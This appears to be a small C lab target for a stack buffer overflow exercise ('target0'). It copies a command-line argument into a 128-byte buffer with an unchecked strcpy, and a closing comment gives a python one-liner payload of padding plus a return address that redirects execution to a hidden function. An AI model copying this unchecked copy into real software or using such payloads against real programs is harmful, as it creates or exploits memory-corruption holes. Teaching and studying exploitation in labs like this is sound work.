#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void hidden()
{
	fprintf(stdout,"Hijacked! Hidden functionality!\n");
}
int bar(char *arg, char *out)
{
	strcpy(out,arg);
	return 0;
}
int foo(char *argv[])
{
	char buf[128];
	bar(argv[1],buf);
}
int main(int argc, char *argv[])
{
	if (argc!=2)
	{
		fprintf(stderr,"target0:argc!=2\n");
		exit(EXIT_FAILURE);
	}
	foo(argv);
	return 0;
}


//`python -c 'print "A"*136+"\x76"+"\x11"+"\x40"'`
